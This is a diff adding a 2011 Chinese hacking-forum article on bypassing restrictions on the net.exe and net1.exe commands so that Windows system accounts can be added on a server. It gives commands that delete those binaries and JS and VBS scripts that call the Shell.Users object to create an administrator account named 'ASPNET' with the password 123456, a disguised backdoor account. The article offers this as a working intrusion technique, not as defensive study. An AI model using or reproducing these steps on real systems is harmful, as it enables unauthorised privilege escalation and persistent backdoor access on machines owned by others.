@@ -1,0 +1,42 @@
+利用脚本和命令绕过系统权限添加账号
+www.hx99.net    时间: 2011-05-07    阅读: 次     整理: 华西安全网
+有时候一些人对服务器的添加用户的NET和NET1权限做了限制，让很多菜鸟朋友们望而止步。其实个人感觉遇到这个问题都很容易解决的，在此我也共享出我的方法给大家。
+
+cmd命令删除net和net1文件。一般删除之后系统会自动恢复文件，恢复的时候权限是系统重新默认的。大家就可以引用下面这段命令
+
+1：del C:\WINDOWS\system32\net.exe
+
+2：del C:\WINDOWS\system32\net1.exe
+
+你在cmd命令之后你会惊奇的发现可以使用cmd命令来添加系统帐户了，如果提示系统未能找到该文件的话就自己上传一个去，这个我也不用多说了，也就是自己系统下面的net文件xp系统下的net文件也是一样的。一般此方法的成功率在百分之七十！
+
+如果上面方法未能成功的话我们还可以使用另外一个方法，这个方法我也都是网上查看到的。感觉这个方法很实用，所以也都贡献给大家吧，就是利用用户控制面板文件nusrmgr.cpl，发现调用的是Shell.Users来加用户，它还同时调用了 wscript.shell、Shell.Application、Shell.LocalMachine这三个组件。不过加用户的话，这一个 Shell.Users就足够了。那么可能在删掉了net.exe和不用adsi之外，这也是另外一种添加系统账号的方法哦，代码如下：
+
+
+
+js脚本:
+
+var o=new ActiveXObject( "Shell.Users" ); 
+z=o.create("ASPNET") ;
+z.changePassword("123456","")
+z.setting("AccountType")=3;
+
+vbs脚本:
+
+Set o=CreateObject( "Shell.Users" )
+Set z=o.create("ASPNET") 
+z.changePassword "123456",""
+z.setting("AccountType")=3
+
+0:"Guests"
+1:"Users"
+2:"Power Users"
+3:"Administrators"
+
+
+帐号：ASPNET
+密码：123456
+
+相信上面大家也看的懂吧，也就是利用VBS和JS脚本来添加系统帐户。我也有测试过发现的确可行，上面gueste那些是需要添加进去的组，自己可以选择，大家有什么不懂的可以联系我吧！
+
+
